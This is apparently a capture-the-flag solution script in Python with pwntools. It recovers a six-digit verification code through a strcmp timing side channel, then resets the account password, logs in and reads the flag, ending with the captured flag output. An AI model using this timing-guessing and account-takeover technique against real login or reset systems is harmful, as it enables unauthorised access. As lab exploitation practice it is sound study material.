'''
No Binary, password guessing attack through strcmp time difference
the verification code is changing every time binary restarts and nc connection restarts
so exploit should be completed within one connection

Insight: sidechannel defense, a variant fluctuates more than sidechannel variant
'''

from pwn import *
import time
import json


url, port = "node5.buuoj.cn", "26425" 
context(arch="amd64", os="linux")
context.log_level = 'error'
io = remote(url, port)

def guess_code(pref, rounds=10, time_threshold=0.15):
    maxtime = 0
    maxv = ''
    statistic = {}
    for i in '0123456789':
        password = (pref + i).ljust(6, '0')
        totaltime = 0.0
        statistic[i] = []
        cnt = 0
        for j in range(rounds):
            io.sendlineafter(b'>', b'3') # forget password
            io.recvuntil(b'Input code:')

            io.sendline(password.encode())
            iotime_start = time.time()
            recvcont = io.recv(10)
            iotime_end = time.time()
            iotime = iotime_end - iotime_start
            if iotime < time_threshold:
                cnt += 1
                totaltime += iotime
                statistic[i].append(iotime)

            if j == rounds-1: print(recvcont)
            if b'Wrong' not in recvcont:
                print(f'password: {password}')
                io.sendline(b'falca')
                io.sendlineafter(b'>', b'2')
                io.sendlineafter(b'Input password:', b'falca')
                io.sendline(b'cat flag')
                io.interactive()
                pause()
                break
                
        avgtime = totaltime / cnt
        if avgtime > maxtime:
            maxtime = avgtime
            maxv = i

    return maxv, statistic


if __name__ == "__main__":
    prefix = ''
    time_statistic = {}
    for i in range(6):
        maxi, statistic = guess_code(prefix)
        prefix += maxi
        time_statistic[i] = statistic
        print(prefix)

    with open('./time_statistic.json', 'w') as f:
        json.dump(time_statistic, f, indent=4)
    print('time statistic saved to {}'.format('./time_statistic.json'))

'''
password: 692177
Log in successful!!!flag{3c504063-e025-4f6b-b0a1-d75b30852f96}
'''
